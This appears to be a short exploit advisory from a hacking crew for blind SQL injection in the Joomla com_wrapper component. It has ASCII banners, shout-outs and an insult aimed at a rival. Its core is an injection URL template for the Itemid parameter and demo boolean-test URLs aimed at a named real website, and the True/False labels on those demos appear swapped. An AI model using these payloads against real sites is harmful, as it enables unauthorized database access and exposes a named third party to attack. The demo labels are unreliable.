@@ -1,0 +1,49 @@
+Joomla com_wrapper SQL注入漏洞
+
+[Joomla com_wrapper SQL注入漏洞 全文]Joomla Component com_wrapper SQL 注入漏洞 
++========================================================================== 
+=========+ 
+./SEC-R1Z _ __ _ _ _ _ ___ _ _ _ _ __ _ _ _ _ _ 
+
+/ /_ _ _ _ / _ _\/ _ _ /\ \< |/_ _ _ _ / 
+\ \_ _ _ _/ /___ / / __ | |) / | | / / 
+\_ _ _ _/ /___ / / | __ || / | | / / 
+_______\ \_ _ \ \2_0_0_9 | \ | | / /____ 
+/_ _ _ _ _\ _ _ _/\ _ _ _ / |__|\ __\ |__|/_ _ _ _ _\ R.I.P 
+MichaelJackson !!!!! 
++========================================================================== 
+=========+ 
+
+[?] ~ Note : sEc-r1z CrEw# r0x ! 
+=========================================================================== 
+=== 
+[?] Joomla Component com_wrapper SQL Blind Injection Vulnerability 
+=========================================================================== 
+=== 
+[?] My home: [http://sec-r1z.com ] 
+[?] Script: [ Joomla Component com_wrapper ] 
+[?] Language: [ PHP ] 
+[?] Founder: [ ./Red-D3v1L ] 
+[?] Gr44tz to: [ sec-r1z# Crew - Hackteach Team - My L0ve 
+~A~ ] 
+[?] Fuck To : [ Zombie_KsA << big big big L4m3r ] 
+######################################################################## 
+
+===[ Exploit SQL ]=== 
+
+[?]SQL : 
+[Path]/index.php?option=com_wrapper&view=wrapper&Itemid==[inj3ct C0dE] 
+
+[?]dem0: 
+
+This True : 
+
+http://www.doubleclick.ps/index.php?option=com_wrapper&view=wrapper&Itemid= 
+92%20and%201=0 
+
+This False : 
+
+http://www.doubleclick.ps/index.php?option=com_wrapper&view=wrapper&Itemid= 
+92%20and%201=1 
+
+===========================================================================  
